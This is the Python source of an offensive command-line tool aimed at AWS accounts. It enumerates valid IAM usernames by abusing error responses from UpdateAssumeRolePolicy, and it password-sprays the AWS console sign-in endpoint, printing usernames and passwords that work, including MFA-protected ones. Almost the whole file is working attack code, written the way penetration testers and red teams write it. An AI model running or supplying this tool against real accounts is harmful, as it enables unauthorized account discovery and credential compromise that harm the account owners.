import requests
import argparse
import boto3
import textwrap
import sys
import json
import time
import boto3.exceptions
from botocore.exceptions import ClientError, EndpointConnectionError

def banner():

    print("""   ___ _      __  ____     __  __              _____         __       """)
    print("""  / _ | | /| / / / __/    / / / /__ ___ ____  / __(_)__  ___/ /__ ____""")
    print(""" / __ | |/ |/ /  \\ \\     / /_/ (_-</ -_) __/ / _// / _ \\/ _  / -_) __/""")
    print("""/_/ |_|__/|__/e ___/ome  \\____/___/\\__/_/   /_/ /_/_//_/\\_,_/\\__/_/  \n""")

    print("""                Another tool brought to you by The Mayor                    """)
    print("""                                 v1.0                                       """)
    print("-"*70)
def options():
    opt_parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """Example: python3 AWeSomeConsoleUserFinder.py -a 1234567890 -f -ak <accesskey> -sk <secretkey> -r users.txt
            python3 AWeSomeConsoleUserFinder.py -a 1234567890 -s -p Password -r users.txt
"""
        ),
    )
    requiredArgs = opt_parser.add_argument_group('Required Arguments')
    requiredArgs.add_argument("-a", "--account", help="AWS account to check for IAM users")
    requiredArgs.add_argument("-r", "--read", help="Reads usernames from a file to test")
    opt_parser.add_argument("-ak", "--accesskey", help="Access key for enumerating users")
    opt_parser.add_argument("-sk", "--secretkey", help="Secret key for enumerating users")
    opt_parser.add_argument("-s", "--spray", help="Password spray a list of account names", action="store_true")
    opt_parser.add_argument("-p", "--password", help="Password to spray")
    opt_parser.add_argument("-f", "--find", help="Find valid AWS IAM account names", action="store_true")
    opt_parser.add_argument("-rn", "--rolename", help="Role name to add to the assume policy document")
    opt_parser.add_argument(
        "-t", "--timeout", help="Set pause time between password spraying attempts. Default - 2 seconds")
    opt_parser.add_argument(
        "-v", "--verbose", help="Prints output verbosely", action="store_true"
    )
    global args
    args = opt_parser.parse_args()
    if len(sys.argv) == 1:
        opt_parser.print_help()
        opt_parser.exit()

def enum():
    try:
        found_users = 0
        if args.timeout:
            timeout = args.timeout
        else:
            timeout = 0
        print(f'Finding valid IAM usernames in {args.account}. Please be patient...')
        session = boto3.Session(aws_access_key_id=args.accesskey, aws_secret_access_key=args.secretkey)
        iam_client = session.client("iam")
        with open(args.read) as possible_users:
            for possible_user in possible_users:
                username = possible_user.strip()
                arn_val = f"arn:aws:iam::{args.account}:user/{username}"
                policy_document = {"Version": "2012-10-17","Statement": [{"Effect": "Deny","Principal": {"AWS": arn_val},"Action": ["sts:AssumeRole"]}]}
                policy_document_str = json.dumps(policy_document)
                try:
                    time.sleep(int(timeout))
                    enum_user = iam_client.update_assume_role_policy(
                        PolicyDocument=policy_document_str,
                        RoleName=args.rolename,
                    )
                    if args.verbose:
                        print(enum_user)
                    print(f"[+] Valid Username Found - {arn_val}")
                    found_users = found_users + 1
                except ClientError as e:
                    if e.response["Error"]["Code"] == "SignatureDoesNotMatch":
                        print('\nInvalid Signature. Most likely reason is the access key and secret key are incorrect.\nQuitting...')
                        quit() 
                    if e.response["Error"]["Code"] == "AccessDenied":
                        print(f'\nThe account used does not have the necessary permissions to modify \nUpdateAssumeRolePolicy in {args.rolename}. Quitting...')
                        quit()
                    if e.response["Error"]["Code"] == "MalformedPolicyDocument":
                        #This means the IAM user is not real.
                        pass
                    else:
                        pass
                except EndpointConnectionError:
                    print("\nSome issue occurred with your network connection. Quitting...")
                    quit()
        print('Reverting UpdateAssumeRolePolicy policy back to default deny all...')
        revert_policy_document = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Deny",
                    "Principal": {"AWS": "*"},
                    "Action": ["sts:AssumeRole"]
                }
            ]
        }
        policy_document_str = json.dumps(revert_policy_document)
        revert_role_policy = iam_client.update_assume_role_policy(PolicyDocument=policy_document_str, RoleName=args.rolename)
        print(f"{found_users} valid IAM usernames found. Quitting...")
    except KeyboardInterrupt:
        print('\nYou either fat fingered this, or something else. Either way, quitting. But first, reverting UpdateAssumeRolePolicy policy back to default deny all...')
        revert_policy_document = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Deny",
                    "Principal": {"AWS": "*"},
                    "Action": ["sts:AssumeRole"]
                }
            ]
        }
        policy_document_str = json.dumps(revert_policy_document)
        try:
            revert_role_policy = iam_client.update_assume_role_policy(PolicyDocument=policy_document_str, RoleName=args.rolename)
            print("Policy reverted successfully.")
        except Exception:
            print("Some issue occurred that prevented the policy from being updated. Make sure to update manually in AWS console.")
def spray():
    found_creds = 0
    if args.timeout:
        timeout = args.timeout
    else:
        timeout = 2
    print('Password spraying provided IAM usernames. Please be patient...')
    session = requests.session()
    with open(args.read) as input_usernames:
        for line in input_usernames:
            username = line.strip()
            aws_signing_url = "https://signin.aws.amazon.com:443/authenticate"
            headers = {"User-Agent": "Fake-Client-HTTP/1.1",
                        "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate, br"}
            data = {"account": args.account, "action": "iam-user-authentication", "client_id": "arn:aws:signin:::console/canvas",
                    "password": args.password, "redirect_uri": "https://console.aws.amazon.com", "rememberAccount": "false", "username": username}
            time.sleep(int(timeout))
            response = session.post(aws_signing_url, data=data, headers=headers)
            try:
                response_data = response.json()
                if args.verbose:
                    print(f"Username: {username}")
                    print(response_data)
            except:
                print('AWS is rate limiting attempts most likely. Pausing for 30 seconds and adding a 5 second timeout between attempts.')
                time.sleep(20)
                timeout = 10
            usercreds = f"{username}:{args.password}"
            if response_data.get('state') == 'SUCCESS':
                if response_data.get('properties', {}).get('result') == 'MFA':
                    print(
                        f"[+]Valid Credentials Found, but MFA Enabled! - {usercreds}")
                    found_creds = found_creds + 1
                    continue_check = input("Do you want to continue? (y/n) ")
                    if continue_check.lower() == "y":
                        continue
                    else:
                        print("Quitting...")
                        quit()
                else:
                    print(
                        f"[+]Valid Credentials Found! - {usercreds}")
                    found_creds = found_creds + 1
                    continue_check = input("Do you want to continue? (y/n) ")
                    if continue_check.lower() == "y":
                        continue
                    else:
                        print("Quitting...")
                        quit()
            else:
                pass
    print(f"{found_creds} identified during scan. Quitting...")  
if __name__ == "__main__":
    try:
        banner()
        options()
        if args.find:
            enum()
        if args.spray:
            spray()
    except KeyboardInterrupt:
        print('You either fat fingered this, or something else. Otherwise, quitting!')
        quit()
